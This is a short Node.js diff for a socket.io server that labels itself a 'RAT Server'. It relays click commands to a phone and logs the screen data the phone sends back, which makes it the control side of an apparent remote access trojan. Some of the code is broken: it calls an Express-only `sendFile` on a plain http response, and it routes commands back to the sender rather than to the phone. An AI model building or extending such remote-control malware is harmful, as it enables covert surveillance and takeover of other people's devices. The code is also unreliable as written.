@@ -1,6 +1,6 @@
 const http = require('http');
 const socketIo = require('socket.io');
-const path = require('path'); // Added to help find the file
+const path = require('path');
 
 // Create an HTTP server
 const server = http.createServer();
@@ -13,24 +13,21 @@ server.on('request', (req, res) => {
     if (req.url === '/socket.io/socket.io.js') {
         res.sendFile(path.join(__dirname, 'node_modules', 'socket.io-client', 'dist', 'socket.io.js'));
     } else {
-        res.writeHead(404);
-        res.end('Not Found');
+        // If it's not the client library, send a simple response
+        res.writeHead(200);
+        res.end('RAT Server is Running');
     }
 });
 
 io.on('connection', (socket) => {
     console.log('User connected:', socket.id);
 
-    // When YOU click on the web dashboard
     socket.on('control-command', (data) => {
-        // data contains { type: 'click', x: 100, y: 200 }
-        // Broadcast to the specific phone
+        // Send command to the specific phone
         io.to(socket.id).emit('execute-command', data);
     });
 
-    // When the PHONE sends screen data
     socket.on('screen-data', (data) => {
-        // Save to database or stream to dashboard
         console.log('Phone screen update:', data);
     });
     
@@ -39,7 +36,6 @@ io.on('connection', (socket) => {
     });
 });
 
-// Start the server
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
